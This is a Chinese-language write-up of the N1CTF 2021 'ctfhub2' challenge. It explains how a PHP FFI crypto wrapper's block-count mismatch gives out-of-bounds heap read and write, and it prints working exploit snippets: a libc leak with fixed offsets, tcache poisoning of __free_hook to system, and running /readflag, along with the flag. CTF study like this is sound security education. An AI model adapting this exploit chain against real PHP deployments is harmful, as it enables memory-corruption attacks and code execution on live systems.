# N1CTF 2021 - ctfhub2

## 题目简述

题目提供受限 PHP 环境和通过 FFI 暴露的 `crypt.so`。PHP 包装器允许创建/释放持久 FFI 缓冲区，并调用自定义 `encrypt/decrypt`。原生函数只接收输入指针、块数、密钥和输出指针，却不知道输出缓冲区实际大小；把过大的块数与较小 FFI 缓冲区组合后，可在 glibc 堆上实现越界读写。

官方 `exploit.php` 最终通过 unsorted-bin 泄露、tcache poisoning 和 `__free_hook -> system` 执行 `/readflag`。

## 解题过程

### 把密码接口变成越界复制

`creatbuf(size)` 会按 `size` 字节申请 `unsigned long long[]`，并使用持久标志，因此内存来自系统 glibc 堆而不是 PHP 请求堆。`encrypt/decrypt` 的第二个参数却按 64 位块计数，每处理一块就读写一个 qword，且不会核对目标对象长度。

官方利用用一个足够大的中转缓冲区把两次变换组合成近似 `memcpy`：

```php
$cpbuf = creatbuf(544 * 8);

function memcpy64($dst, $src, $length) {
    global $cpbuf;
    encrypt_impl($src, $length / 8, 0, $cpbuf);
    decrypt_impl($cpbuf, $length / 8, 0, $dst);
}
```

若 `$src` 只有 272 个 qword，却令 `$length=(272+21)*8`，就会额外读取相邻 21 个 qword；交换源和目的即可越界写。这个原语的根因和复现细节也可见参赛者 [circleous 的完整分析](https://circleous.blogspot.com/2021/11/n1ctf-2021-ctfhub2.html)，本文下面已将利用所需信息完整展开。

### 泄露堆与 libc

先安排相邻的大块：

```php
$buffer = creatbuf(544 * 8);
$a      = creatbuf(272 * 8);
$b      = creatbuf(272 * 8);
$guard  = creatbuf(272 * 8);
releasestr($b);

memcpy64($buffer, $a, (272 + 21) * 8);
```

`$buffer[272...]` 对应越过 `$a` 后读出的 chunk 元数据。释放后的大块进入 unsorted bin，`fd/bk` 指向 `main_arena`；官方脚本检查泄露地址高位为 `0x7f` 且低 12 位为 `0xbe0`，以确认 Ubuntu 20.04 / glibc 2.31 的 arena 指针。

接着大量申请固定内容为 `0x3333333333333333` 的小块，直到其中一个落到可由 `$a` 越界覆盖的区域。再次 OOB 读取时，哨兵值可精确定位相邻 chunk 和一个稳定的 libc 指针。官方偏移计算为：

```php
$libc_base     = $buffer[272 + 20] - 2014176;
$libc_freehook = $libc_base + 2026280;
$libc_system   = $libc_base + 349200;
```

这些偏移严格绑定题目所附 libc，换环境时必须重新由符号表确认。

### tcache poisoning 覆盖 `__free_hook`

先释放一个受控字符串块，再释放同尺寸的 `$dummy`，形成两项 tcache 链。通过 OOB 写把链表 `next` 改成 `__free_hook`：

```php
freebuf($chunks[0]);
freebuf($dummy);

memcpy64($buffer, $a, (272 + 21) * 8);
$buffer[272 + 20] = $libc_freehook;
memcpy64($a, $buffer, (272 + 21) * 8);
```

随后两次同尺寸 `creatbuf`，第二次返回 `__free_hook`。向第一个 qword 写入 `system`，再释放内容为 `/readflag\0` 的 FFI 字符串：

```php
creatbuf(8 * 16);
$hook = creatbuf(8 * 16);
$hook[0] = $libc_system;
freebuf($binsh); // $binsh 实际保存 "/readflag\0"
```

官方利用注释保存了成功输出：

```text
n1ctf{Ma5TEr_Of_PHP_d70809e19fbdb091a3f607c2b86a3a05a483670c9e45124c6796c6e830}
```

## 方法总结

FFI 会把高级语言中的“长度单位不一致”直接放大成原生内存破坏。审计接口时应逐项确认参数是字节、元素还是块，并同时校验输入与输出对象的真实容量。本题后半段是标准 glibc 2.31 堆利用，但 PHP 的持久 FFI 分配决定了它确实落在可利用的系统堆上。
